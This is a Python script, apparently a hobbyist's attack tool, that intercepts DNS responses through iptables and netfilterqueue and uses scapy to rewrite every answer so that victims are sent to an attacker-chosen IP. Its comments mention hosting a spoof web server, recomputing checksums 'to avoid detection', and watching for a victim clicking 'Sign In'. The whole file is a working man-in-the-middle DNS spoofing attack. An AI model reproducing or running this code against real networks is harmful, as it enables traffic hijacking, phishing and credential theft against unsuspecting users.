#!/usr/bin/env python

#1. apt-get install build-essential python-dev libnetfilter-queue-dev
#2. apt install python3-pip git libnfnetlink-dev libnetfilter-queue-dev
#3. pip install netfilterqueue -->  netfilterqueue lets us stack iptables
# service apache2 start
import netfilterqueue
import scapy.all as scapy
import sys
import os
from scapy.layers import http
import subprocess
from time import sleep

myip = sys.argv[1]

print("[+] Spoof in progress. Waiting for DNS requests to intercept.")
# change ip tables to set up queue --> iptables -I FORWARD -j NFQUEUE --queue-num 0 (use OUTPUT instead of FORWARD for local machine)
# get IP quick ip -c 1 www.google.com

spoof = True

def process_packet(packet):
    global queue

    # print(packet)
    # packet.accept()
    # can't access layers unless we convert to scapy

    scapy_packet = scapy.IP(packet.get_payload())
    # # DNSRR:DNS Resource Record DNSQ:DNS Query
#    if scapy_packet.haslayer(http.HTTPRequest):
#        if scapy_packet.haslayer(scapy.Raw):
#            packet_load = str(scapy_packet[scapy.Raw])
#            if "aaaaazzzzz.html" in packet_load:
#                spoof = False
#                print("They clicked 'Sign In' - Ending DNS Spoof")

    if spoof == True:
        if scapy_packet.haslayer(scapy.DNSRR):
        # print(scapy_packet.show())
            qname = scapy_packet[scapy.DNSQR].qname

#            if "aaaaazzzzz.com" in qname:
#                print("We're on the right track")
#                subprocess.call(["iptables", "-F"], shell=True)
#                queue.unbind()
#                print("Just ran queue.unbind")
#                subprocess.call("dns_spoof_pid=$(ps -aux | grep './dns_spoof' | grep -v 'grep' | awk '{ print $2 }')")
#                print("Just tried to set a bash variable")
#                subprocess.call("echo $dns_spoof_pid")
#                print("Just tried to kill the process")

            if '.' in qname:
                print("[+] DNS request intercepted, redirecting victim to " + myip)
            # qname:query website rrname:resource record website
            # DNSQ is for query, we want DNSRR (response query is complex OSI model)
            # rdata: where are we hosting our spoof server?
                answer = scapy.DNSRR(rrname=qname, rdata=myip)
                scapy_packet[scapy.DNS].an = answer
                scapy_packet[scapy.DNS].anount = 1

            # we need to delete these values and scapy will redo them for us to avoid detection
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].chksum
                del scapy_packet[scapy.UDP].len

            # convert from scapy packet back to original (string)
                packet.set_payload(str(scapy_packet))

                if "redirect" in qname:
                    packet.accept()
#                    time.sleep(1)
                    print("We're on the right track")
                    subprocess.call(["iptables -F"], shell=True)
    
    # k, it won't forward bcak to target without this .accept()
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
# bind to list (queue list number and execute function)

queue.bind(0, process_packet)

queue.run()
